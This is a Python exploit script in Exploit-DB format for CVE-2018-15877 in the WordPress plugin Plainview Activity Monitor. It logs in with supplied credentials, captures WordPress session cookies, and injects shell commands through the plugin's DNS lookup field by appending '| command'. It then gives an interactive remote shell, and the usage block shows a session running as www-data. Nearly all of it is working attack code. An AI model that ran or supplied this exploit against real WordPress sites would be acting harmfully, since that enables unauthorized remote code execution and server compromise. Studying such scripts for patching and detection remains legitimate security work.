# Exploit Title: WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)
# Date: 07.07.2021
# Exploit Author: Beren Kuday GORUN
# Vendor Homepage: https://wordpress.org/plugins/plainview-activity-monitor/
# Software Link: https://www.exploit-db.com/apps/2e1f384e5e49ab1d5fbf9eedf64c9a15-plainview-activity-monitor.20161228.zip
# Version: 20161228 and possibly prior
# Fixed version: 20180826
# CVE : CVE-2018-15877

"""
-------------------------
Usage:
┌──(root@kali)-[~/tools]
└─# python3 WordPress-Activity-Monitor-RCE.py
What's your target IP?
192.168.101.28
What's your username?
mark
What's your password?
password123
[*] Please wait...
[*] Perfect! 
www-data@192.168.101.28  whoami
www-data
www-data@192.168.101.28  pwd
/var/www/html/wp-admin
www-data@192.168.101.28  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
"""

import requests
from bs4 import BeautifulSoup

def exploit(whoami, ip):
	while 1:
		cmd = input(whoami+"@"+ip+"  ")
		url = 'http://' + ip + '/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools'
		payload = "google.com.tr | " + cmd
		data = {'ip': payload , 'lookup' : 'lookup' }
		x = requests.post(url, data = data, cookies=getCookie(ip))
		html_doc = x.text.split("<p>Output from dig: </p>")[1]
		soup = BeautifulSoup(html_doc, 'html.parser')
		print(soup.p.text)

def poc(ip):
	url = 'http://' + ip + '/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools'
	myobj = {'ip': 'google.fr | whoami', 'lookup' : 'lookup' }
	x = requests.post(url, data = myobj, cookies=getCookie(ip))
	html_doc = x.text.split("<p>Output from dig: </p>")[1]
	soup = BeautifulSoup(html_doc, 'html.parser')
	print("[*] Perfect! ")
	exploit(soup.p.text, ip)

def getCookie(ip):
	url = 'http://' + ip + '/wp-login.php'
	#log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1
	data = {'log':username, 'pwd':password, 'wp-submit':'Log In', 'testcookie':'1'}
	x = requests.post(url, data = data)
	cookies = {}
	cookie = str(x.headers["Set-Cookie"])

	for i in cookie.split():
		if(i.find("wordpress") != -1 and i.find("=") != -1):
			cookies[i.split("=")[0]] = i.split("=")[1][:len(i.split("=")[1])-1]
	return cookies

ip = input("What's your target IP?\n")
username = input("What's your username?\n")
password = input("What's your password?\n")
print("[*] Please wait...")
poc(ip)